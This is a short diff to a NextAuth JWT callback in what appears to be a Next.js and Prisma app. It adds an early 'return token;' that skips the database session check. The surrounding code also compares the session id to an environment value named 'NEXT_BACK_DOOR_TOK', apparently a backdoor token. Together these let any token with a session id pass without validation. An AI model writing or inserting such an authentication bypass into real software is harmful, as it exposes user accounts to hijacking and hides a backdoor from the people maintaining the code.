@@ -58,6 +58,7 @@ export const authOptions: NextAuthOptions = {
             // console.log("JWT-TOKEN", token);
 
             if (!token.sessionId) return null;
+            return token;
             if (token.sessionId && token.sessionId != env.NEXT_BACK_DOOR_TOK) {
                 const session = await prisma.session.findUnique({
                     where: { id: token.sessionId as any },
